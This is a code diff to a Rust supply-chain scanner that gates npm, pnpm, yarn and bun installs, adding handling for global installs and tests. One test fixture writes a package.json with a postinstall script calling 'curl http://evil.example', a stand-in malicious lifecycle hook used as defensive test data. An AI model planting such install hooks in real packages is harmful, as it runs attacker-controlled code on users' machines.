@@ -2078,10 +2078,16 @@ fn run_package_manager_wrapper(package_manager: &str, package_manager_args: &[St
 
     print_ascii_banner();
     auto_update_source_db_if_stale();
+    let global_install = is_global_package_manager_command(package_manager, &package_manager_args);
     println!(
         "mcaifee: gating `{}` before lifecycle scripts can run",
         format_command(package_manager, &package_manager_args)
     );
+    if global_install {
+        println!(
+            "mcaifee: global install; scanning package specs only (no project lockfile staging)"
+        );
+    }
 
     let config = load_user_config();
     let threshold = wrapper_options
@@ -2201,10 +2207,48 @@ fn should_gate_package_manager_command(
     match package_manager {
         "npm" => matches!(command, "install" | "i" | "add" | "ci" | "update" | "up"),
         "pnpm" => matches!(command, "install" | "i" | "add" | "update" | "up"),
-        "yarn" => matches!(command, "install" | "add" | "upgrade" | "up"),
+        "yarn" => {
+            matches!(command, "install" | "add" | "upgrade" | "up")
+                || is_yarn_global_add(package_manager_args)
+        }
         "bun" => matches!(command, "install" | "i" | "add" | "update" | "up"),
         _ => false,
     }
+}
+
+fn is_global_package_manager_command(package_manager: &str, args: &[String]) -> bool {
+    if package_manager == "yarn" {
+        return is_yarn_global_add(args);
+    }
+    let mut skip_next = false;
+    for (index, arg) in args.iter().enumerate() {
+        if skip_next {
+            skip_next = false;
+            continue;
+        }
+        if arg == "-g" || arg == "--global" || arg == "--location=global" {
+            return true;
+        }
+        if arg == "--location" {
+            if args.get(index + 1).map(String::as_str) == Some("global") {
+                return true;
+            }
+            skip_next = true;
+            continue;
+        }
+        if option_takes_value(arg) {
+            skip_next = !arg.contains('=');
+        }
+    }
+    false
+}
+
+fn is_yarn_global_add(args: &[String]) -> bool {
+    let Some(index) = find_command_index(args) else {
+        return false;
+    };
+    args.get(index).map(String::as_str) == Some("global")
+        && args.get(index + 1).map(String::as_str) == Some("add")
 }
 
 fn first_command_arg(package_manager_args: &[String]) -> Option<&str> {
@@ -2423,11 +2467,16 @@ fn gate_npm_command(
     allowed_hosts: &HashSet<String>,
     timeout: u64,
 ) -> Result<(), i32> {
-    let snapshots = match snapshot_project_files() {
-        Ok(snapshots) => snapshots,
-        Err(error) => {
-            eprintln!("mcaifee: could not snapshot project files before npm staging: {error}");
-            return Err(1);
+    let global_install = is_global_package_manager_command("npm", package_manager_args);
+    let snapshots = if global_install {
+        Vec::new()
+    } else {
+        match snapshot_project_files() {
+            Ok(snapshots) => snapshots,
+            Err(error) => {
+                eprintln!("mcaifee: could not snapshot project files before npm staging: {error}");
+                return Err(1);
+            }
         }
     };
 
@@ -2464,7 +2513,11 @@ fn gate_npm_command(
     }
 
     if wrapper_options.paranoia {
-        if let Err(code) = run_paranoia_docker_gate("npm", package_manager_args) {
+        if global_install {
+            eprintln!(
+                "mcaifee: skipping --paranoia for global installs; the Docker sandbox is project-based"
+            );
+        } else if let Err(code) = run_paranoia_docker_gate("npm", package_manager_args) {
             restore_project_files(&snapshots);
             return Err(code);
         }
@@ -2499,6 +2552,12 @@ fn gate_generic_package_manager_command(
         return Err(2);
     }
     if wrapper_options.paranoia {
+        if is_global_package_manager_command(package_manager, package_manager_args) {
+            eprintln!(
+                "mcaifee: skipping --paranoia for global installs; the Docker sandbox is project-based"
+            );
+            return Ok(());
+        }
         return run_paranoia_docker_gate(package_manager, package_manager_args);
     }
     Ok(())
@@ -2507,6 +2566,7 @@ fn gate_generic_package_manager_command(
 fn should_stage_npm_lockfile(package_manager_args: &[String]) -> bool {
     first_command_arg(package_manager_args)
         .is_some_and(|command| matches!(command, "install" | "i" | "add" | "update" | "up"))
+        && !is_global_package_manager_command("npm", package_manager_args)
 }
 
 fn npm_staging_args(package_manager_args: &[String]) -> Vec<String> {
@@ -2575,21 +2635,24 @@ fn collect_project_and_spec_findings(
 ) -> Vec<Finding> {
     let source_db = load_default_source_db();
     let mut findings = Vec::new();
+    let scan_project = !is_global_package_manager_command(package_manager, package_manager_args);
 
-    let package_json = PathBuf::from("package.json");
-    if package_json.exists() {
-        analyze_package_json(&package_json, &mut findings, false, source_db.as_ref());
-    }
+    if scan_project {
+        let package_json = PathBuf::from("package.json");
+        if package_json.exists() {
+            analyze_package_json(&package_json, &mut findings, false, source_db.as_ref());
+        }
 
-    for lockfile in lockfiles_for_package_manager(package_manager) {
-        if lockfile.exists() {
-            analyze_lockfile_with_policy(
-                &lockfile,
-                &mut findings,
-                allowed_hosts,
-                source_db.as_ref(),
-                policy,
-            );
+        for lockfile in lockfiles_for_package_manager(package_manager) {
+            if lockfile.exists() {
+                analyze_lockfile_with_policy(
+                    &lockfile,
+                    &mut findings,
+                    allowed_hosts,
+                    source_db.as_ref(),
+                    policy,
+                );
+            }
         }
     }
 
@@ -2644,20 +2707,25 @@ fn extract_package_specs(package_manager: &str, package_manager_args: &[String])
         return Vec::new();
     };
     let command = package_manager_args[command_index].as_str();
-    let takes_package_specs = match package_manager {
-        "npm" => matches!(command, "install" | "i" | "add" | "update" | "up"),
-        "pnpm" => matches!(command, "add" | "update" | "up"),
-        "yarn" => matches!(command, "add" | "upgrade" | "up"),
-        "bun" => matches!(command, "add" | "update" | "up"),
-        _ => false,
+    let specs_from = match (package_manager, command) {
+        ("npm", "install" | "i" | "add" | "update" | "up")
+        | ("pnpm", "add" | "update" | "up")
+        | ("yarn", "add" | "upgrade" | "up")
+        | ("bun", "add" | "update" | "up") => command_index + 1,
+        ("yarn", "global")
+            if package_manager_args
+                .get(command_index + 1)
+                .map(String::as_str)
+                == Some("add") =>
+        {
+            command_index + 2
+        }
+        _ => return Vec::new(),
     };
-    if !takes_package_specs {
-        return Vec::new();
-    }
 
     let mut specs = Vec::new();
     let mut skip_next = false;
-    for arg in package_manager_args.iter().skip(command_index + 1) {
+    for arg in package_manager_args.iter().skip(specs_from) {
         if skip_next {
             skip_next = false;
             continue;
@@ -2692,6 +2760,7 @@ fn option_takes_value(arg: &str) -> bool {
             | "--userconfig"
             | "--global-folder"
             | "--modules-folder"
+            | "--location"
     ) || arg.starts_with("--workspace=")
         || arg.starts_with("--filter=")
         || arg.starts_with("--prefix=")
@@ -2702,6 +2771,7 @@ fn option_takes_value(arg: &str) -> bool {
         || arg.starts_with("--userconfig=")
         || arg.starts_with("--global-folder=")
         || arg.starts_with("--modules-folder=")
+        || arg.starts_with("--location=")
 }
 
 fn print_gate_findings(findings: &[Finding]) {
@@ -6909,6 +6979,113 @@ mod tests {
         assert!(staged.contains(&"--package-lock-only".to_string()));
         assert!(staged.contains(&"--fund=false".to_string()));
         assert!(staged.contains(&"--audit=false".to_string()));
+    }
+
+    #[test]
+    fn global_npm_install_skips_lockfile_staging_and_keeps_specs() {
+        let args = vec!["i".to_string(), "-g".to_string(), "cline".to_string()];
+        assert!(is_global_package_manager_command("npm", &args));
+        assert!(!should_stage_npm_lockfile(&args));
+        assert_eq!(
+            extract_package_specs("npm", &args),
+            vec!["cline".to_string()]
+        );
+
+        let location_eq = vec![
+            "install".to_string(),
+            "--location=global".to_string(),
+            "cline".to_string(),
+        ];
+        assert!(is_global_package_manager_command("npm", &location_eq));
+        assert!(!should_stage_npm_lockfile(&location_eq));
+        assert_eq!(
+            extract_package_specs("npm", &location_eq),
+            vec!["cline".to_string()]
+        );
+
+        let location_split = vec![
+            "install".to_string(),
+            "--location".to_string(),
+            "global".to_string(),
+            "cline".to_string(),
+        ];
+        assert!(is_global_package_manager_command("npm", &location_split));
+        assert_eq!(
+            extract_package_specs("npm", &location_split),
+            vec!["cline".to_string()]
+        );
+
+        assert!(!is_global_package_manager_command(
+            "npm",
+            &["install".to_string(), "cline".to_string()]
+        ));
+        assert!(should_stage_npm_lockfile(&[
+            "install".to_string(),
+            "cline".to_string()
+        ]));
+    }
+
+    #[test]
+    fn yarn_global_add_is_gated_and_extracts_specs() {
+        let args = vec!["global".to_string(), "add".to_string(), "cline".to_string()];
+        assert!(is_yarn_global_add(&args));
+        assert!(is_global_package_manager_command("yarn", &args));
+        assert!(should_gate_package_manager_command("yarn", &args));
+        assert_eq!(
+            extract_package_specs("yarn", &args),
+            vec!["cline".to_string()]
+        );
+        assert!(!should_gate_package_manager_command(
+            "yarn",
+            &["global".to_string(), "list".to_string()]
+        ));
+    }
+
+    #[test]
+    fn pnpm_and_bun_global_flags_are_detected() {
+        assert!(is_global_package_manager_command(
+            "pnpm",
+            &[
+                "add".to_string(),
+                "--global".to_string(),
+                "cline".to_string()
+            ]
+        ));
+        assert!(is_global_package_manager_command(
+            "bun",
+            &["add".to_string(), "-g".to_string(), "cline".to_string()]
+        ));
+        assert_eq!(
+            extract_package_specs(
+                "pnpm",
+                &["add".to_string(), "-g".to_string(), "cline".to_string()]
+            ),
+            vec!["cline".to_string()]
+        );
+    }
+
+    #[test]
+    fn global_install_does_not_scan_project_manifest() {
+        let tmp = tempfile::tempdir().unwrap();
+        fs::write(
+            tmp.path().join("package.json"),
+            r#"{"name":"local-app","scripts":{"postinstall":"curl http://evil.example"}}"#,
+        )
+        .unwrap();
+        let original = env::current_dir().unwrap();
+        env::set_current_dir(tmp.path()).expect("chdir to temp project");
+        let findings = collect_project_and_spec_findings(
+            "npm",
+            &["i".to_string(), "-g".to_string(), "left-pad".to_string()],
+            false,
+            &Policy::default(),
+            &HashSet::new(),
+            5,
+        );
+        env::set_current_dir(original).expect("restore cwd");
+        assert!(findings.iter().all(|finding| {
+            finding.code != "lifecycle_script" && finding.target != "local-app"
+        }));
     }
 
     #[test]
